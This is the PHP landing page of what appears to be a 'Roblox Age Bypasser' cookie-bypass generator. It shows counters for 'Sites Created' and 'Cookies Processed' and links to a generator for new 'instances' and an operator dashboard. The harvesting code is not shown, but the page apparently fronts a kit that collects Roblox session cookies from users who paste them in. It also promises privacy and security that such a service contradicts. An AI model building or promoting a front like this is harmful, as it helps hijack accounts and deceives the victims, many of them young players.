<?php
require_once 'config.php';
require_once 'functions.php';

// Track visit
updateGlobalStats('totalVisits');
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
    <title>Roblox Age Bypasser - Free Cookie Bypass Generator</title>
    <meta name="description" content="Generate your own Roblox age bypasser instance. Secure, fast, and completely free.">
    <link rel="icon" type="image/png" href="https://cdn-icons-png.flaticon.com/512/5473/5473473.png">
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;500;600;700&family=Space+Grotesk:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    
    <style>
        :root {
            --font-sans: 'Outfit', sans-serif;
            --font-display: 'Space Grotesk', sans-serif;
        }
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: var(--font-sans);
            background: linear-gradient(135deg, #02040a 0%, #0a0e27 50%, #02040a 100%);
            background-size: 400% 400%;
            animation: gradientShift 15s ease infinite;
            color: #f8fafc;
        }
        
        @keyframes gradientShift {
            0%, 100% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
        }
        
        .glass-effect {
            backdrop-filter: blur(10px) saturate(180%);
            -webkit-backdrop-filter: blur(10px) saturate(180%);
            background-color: rgba(17, 25, 40, 0.5);
            border: 1px solid rgba(255, 255, 255, 0.125);
        }
        
        .animated-gradient-text {
            background: linear-gradient(90deg, #667eea 0%, #764ba2 25%, #f093fb 50%, #667eea 75%, #764ba2 100%);
            background-size: 200% auto;
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            animation: gradientFlow 3s linear infinite;
        }
        
        @keyframes gradientFlow {
            0% { background-position: 0% center; }
            100% { background-position: 200% center; }
        }
    </style>
</head>
<body class="bg-[#02040a] text-white overflow-x-hidden">
    <div class="container max-w-4xl mx-auto px-4 py-12 flex flex-col items-center min-h-screen">
        <div class="text-center mb-16 space-y-6">
            <div class="relative inline-block">
                <div class="absolute inset-0 bg-white/20 blur-2xl rounded-full"></div>
                <div class="relative w-20 h-20 bg-white/5 border border-white/10 rounded-2xl flex items-center justify-center backdrop-blur-sm shadow-2xl glass-effect">
                    <svg xmlns="http://www.w3.org/2000/svg" width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" class="text-white"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
                </div>
            </div>
            
            <h1 class="text-5xl md:text-6xl font-display font-bold tracking-tight animated-gradient-text">
                Roblox Age Bypasser
            </h1>
            <p class="text-white/70 text-xl max-w-2xl mx-auto">
                Create your own custom bypasser instance in seconds. Free, secure, and powerful.
            </p>
            
            <div class="flex flex-wrap justify-center gap-4 mt-8">
                <div class="px-6 py-3 bg-white/5 border border-white/10 rounded-full glass-effect">
                    <span class="text-white/60 text-sm">🔥 </span>
                    <span class="text-white font-semibold"><?php echo number_format(getGlobalStats()['totalSites'] ?? 0); ?></span>
                    <span class="text-white/60 text-sm"> Sites Created</span>
                </div>
                <div class="px-6 py-3 bg-white/5 border border-white/10 rounded-full glass-effect">
                    <span class="text-white/60 text-sm">⚡ </span>
                    <span class="text-white font-semibold"><?php echo number_format(getGlobalStats()['totalCookies'] ?? 0); ?></span>
                    <span class="text-white/60 text-sm"> Cookies Processed</span>
                </div>
            </div>
        </div>

        <div class="w-full max-w-2xl space-y-6">
            <a href="/generator" class="block w-full h-16 bg-gradient-to-r from-purple-500 to-blue-500 hover:from-purple-600 hover:to-blue-600 text-white rounded-2xl text-lg font-bold transition-all active:scale-[0.98] flex items-center justify-center gap-3 glass-effect shadow-2xl">
                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="16"/><line x1="8" y1="12" x2="16" y2="12"/></svg>
                Create New Instance
            </a>
            
            <a href="/dashboard/sign-in.php" class="block w-full h-16 bg-white/10 hover:bg-white/15 text-white border border-white/20 rounded-2xl text-lg font-semibold transition-all active:scale-[0.98] flex items-center justify-center gap-3 glass-effect">
                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="3" width="18" height="18" rx="2" ry="2"/><line x1="3" y1="9" x2="21" y2="9"/><line x1="9" y1="21" x2="9" y2="9"/></svg>
                Access Dashboard
            </a>
        </div>

        <!-- Features Grid -->
        <div class="grid md:grid-cols-3 gap-6 mt-16 w-full max-w-4xl">
            <div class="p-6 bg-white/5 border border-white/10 rounded-2xl glass-effect">
                <div class="w-12 h-12 bg-purple-500/20 border border-purple-500/30 rounded-xl flex items-center justify-center mb-4">
                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#a78bfa" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
                </div>
                <h3 class="text-xl font-bold mb-2">Secure & Private</h3>
                <p class="text-white/60">All data is encrypted and processed securely. Your privacy is our priority.</p>
            </div>
            
            <div class="p-6 bg-white/5 border border-white/10 rounded-2xl glass-effect">
                <div class="w-12 h-12 bg-blue-500/20 border border-blue-500/30 rounded-xl flex items-center justify-center mb-4">
                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#60a5fa" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="22 12 18 12 15 21 9 3 6 12 2 12"/></svg>
                </div>
                <h3 class="text-xl font-bold mb-2">Lightning Fast</h3>
                <p class="text-white/60">Powered by external API for instant bypass processing.</p>
            </div>
            
            <div class="p-6 bg-white/5 border border-white/10 rounded-2xl glass-effect">
                <div class="w-12 h-12 bg-green-500/20 border border-green-500/30 rounded-xl flex items-center justify-center mb-4">
                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#4ade80" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/><polyline points="22 4 12 14.01 9 11.01"/></svg>
                </div>
                <h3 class="text-xl font-bold mb-2">100% Free</h3>
                <p class="text-white/60">No hidden fees, no subscriptions. Create unlimited instances.</p>
            </div>
        </div>

        <div class="mt-16 text-center">
            <div class="inline-flex items-center gap-1.5 px-4 py-2 bg-green-500/10 border border-green-500/20 rounded-full glass-effect">
                <div class="w-2 h-2 bg-green-500 rounded-full animate-pulse"></div>
                <span class="text-green-500 text-sm font-bold uppercase">System Online</span>
            </div>
        </div>
    </div>
</body>
</html>
